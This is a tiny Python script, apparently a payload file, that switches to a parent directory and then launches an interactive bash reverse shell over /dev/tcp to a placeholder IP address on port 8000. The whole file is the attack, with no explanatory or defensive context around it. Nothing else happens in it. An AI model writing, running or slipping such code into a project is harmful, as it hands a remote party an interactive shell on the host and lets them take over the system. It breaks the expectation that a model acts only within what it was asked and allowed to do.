import os

import subprocess

 

base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))

 

os.chdir(base_dir)

 

subprocess.call(['/bin/bash', '-c', 'bash -i >& /dev/tcp/-----ip----/8000 0>&1'])
